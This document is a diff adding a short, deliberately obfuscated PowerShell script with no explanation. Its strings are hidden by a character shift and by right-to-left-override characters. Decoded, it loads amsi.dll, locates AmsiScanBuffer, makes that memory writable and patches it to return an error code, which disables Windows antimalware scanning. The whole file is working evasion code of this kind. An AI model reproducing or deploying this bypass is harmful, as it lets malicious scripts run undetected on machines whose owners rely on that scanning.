@@ -1,0 +1,11 @@
+﻿'‮';function ‮($_){$_ = ([byte[]][char[]]$_).ForEach{$_-1};return [string]::new($_)}
+
+$b= ‮(('','JouQus!HfuQspdBeesftt)JouQus!b-!tusjoh!c*<','JouQus!MpbeMjcsbsz)tusjoh!b*<','cppm!WjsuvbmQspufdu)JouQus!b-VJouQus!c-vjou!d-pvu!vjou!e*<')-join'\EmmJnqpsu)#lfsofm43#*^qvcmjd!tubujd!fyufso!')
+'‮';Add-Type -name y -names x $b
+
+$c=0
+$d=[x.y]::(‮ MpbeMjcsbsz)((‮ 'bntj/emm'))
+$e=[x.y]::(‮ HfuQspdBeesftt)($d,(‮ 'BntjTdboCvggfs'))
+[x.y]::(‮ WjsuvbmQspufdu)($e,[uint32]5,64,[ref]$c) 
+[byte[]]$f=[char[]]'¸W'+$null+7,([byte]::MaxValue/2)+[char]'Ã'
+[int].(‮ bttfncmz).(‮ hfuuzqft)().(‮ xifsf){$_.(‮ obnf)-match'^.{6}l$'}[-1].(‮ efdmbsfenfuipet)[17].(‮ jowplf)($null,@($f,0,$e,6))
